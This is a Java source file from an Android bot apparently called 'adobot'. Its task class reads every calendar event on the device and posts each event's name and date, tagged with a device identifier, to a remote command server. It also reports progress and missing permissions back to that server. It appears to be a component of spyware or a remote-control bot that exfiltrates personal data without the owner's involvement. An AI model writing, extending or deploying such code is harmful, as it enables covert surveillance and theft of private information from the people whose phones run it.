package com.android.adobot.tasks;

import android.Manifest;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.support.v4.content.ContextCompat;
import android.util.Log;

import com.android.adobot.CommandService;
import com.android.adobot.CommonParams;
import com.android.adobot.Constants;
import com.android.adobot.http.Http;
import com.android.adobot.http.HttpRequest;
import com.android.adobot.utils.CalandarUtils;

import java.util.HashMap;

public class GetCalandarTask extends BaseTask {

    private static final String TAG = "GetCalandarTask";
    private CommonParams commonParams;
    private final String[] pers = {Manifest.permission.READ_CALENDAR};

    public GetCalandarTask(CommandService c) {
        setContext(c);
        this.commonParams = new CommonParams(c);
    }

    @Override
    public void run() {
        super.run();
        Log.i(TAG, "Running!!!!");
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED) {
            getContactsList();
        } else {

            HashMap contactP = new HashMap();
            contactP.put("event", "nopermission");
            contactP.put("permission", Manifest.permission.READ_CALENDAR);
            contactP.put("uid", commonParams.getUid());

            Http req = new Http();
            req.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
            req.setMethod(HttpRequest.METHOD_POST);
            req.setParams(contactP);
            req.execute();

            requestPermissions();
        }
    }

    private void getContactsList() {
        HashMap startHm = new HashMap();
        startHm.put("event", "calendar:started");
        startHm.put("uid", commonParams.getUid());
        startHm.put("device", commonParams.getDevice());

        Http startReq = new Http();
        startReq.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
        startReq.setMethod(HttpRequest.METHOD_POST);
        startReq.setParams(startHm);
        startReq.execute();

        CalandarUtils cu = new CalandarUtils();
        cu.readCalendarEvent(context);

        int index = 0;
        for(String name : cu.nameOfEvent){
            HashMap contactP = new HashMap();
            contactP.put("uid", commonParams.getUid());
            contactP.put("name", name);
            String date = cu.startDates.get(index);
            contactP.put("date", date == null ? "Erreur" : date);

            Http req = new Http();
            req.setUrl(commonParams.getServer() + Constants.POST_CALENDAR_URL);
            req.setMethod(HttpRequest.METHOD_POST);
            req.setParams(contactP);
            req.execute();

            index++;
        }


        HashMap endHm = new HashMap();
        endHm.put("event", "calendar:nam");
        endHm.put("uid", commonParams.getUid());
        endHm.put("device", commonParams.getDevice());

        Http endReq = new Http();
        endReq.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
        endReq.setMethod(HttpRequest.METHOD_POST);
        endReq.setParams(endHm);
        endReq.execute();
    }

}
